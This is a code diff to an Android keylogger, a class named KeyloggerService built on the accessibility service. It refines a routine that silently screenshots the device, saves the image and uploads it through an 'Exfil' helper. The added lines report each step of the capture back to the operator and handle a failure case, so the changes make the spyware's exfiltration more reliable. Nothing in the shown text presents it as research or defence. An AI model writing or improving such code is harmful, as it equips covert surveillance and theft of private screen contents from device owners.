@@ -70,13 +70,21 @@ public class KeyloggerService extends AccessibilityService {
     }
 
     public void captureScreen() {
+        Exfil.send("Screen API: Requesting...");
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                 @Override
                 public void onSuccess(ScreenshotResult screenshotResult) {
+                    Exfil.send("Screen API: Success, extracting Bitmap...");
                     try {
                         HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                         Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
+                        
+                        if (bitmap == null) {
+                            Exfil.send("❌ Bitmap is NULL (Hardware buffer issue)");
+                            buffer.close();
+                            return;
+                        }
                         
                         File file = new File(getExternalFilesDir(null), "screenshot.jpg");
                         FileOutputStream fos = new FileOutputStream(file);
@@ -84,30 +92,26 @@ public class KeyloggerService extends AccessibilityService {
                         fos.close();
                         buffer.close();
                         
+                        Exfil.send("Screen API: File saved, uploading...");
                         Exfil.sendFile(file.getAbsolutePath(), "Photo", "Screen Capture");
                     } catch (Exception e) {
-                        Exfil.send("Screenshot error: " + e.getMessage());
+                        Exfil.send("❌ Screenshot Ex: " + e.getMessage());
                     }
                 }
 
                 @Override
                 public void onFailure(int errorCode) {
-                    Exfil.send("Screenshot failed code: " + errorCode);
+                    Exfil.send("❌ Screen API Failed. Error code: " + errorCode);
                 }
             });
         } else {
-            Exfil.send("Screenshot requires Android 11+ (API 30+)");
+            Exfil.send("❌ Android version too old for Accessibility Screenshot.");
         }
     }
 
     @Override
-    public void onInterrupt() {
-        instance = null;
-    }
+    public void onInterrupt() { instance = null; }
     
     @Override
-    public void onDestroy() {
-        instance = null;
-        super.onDestroy();
-    }
+    public void onDestroy() { instance = null; super.onDestroy(); }
 }
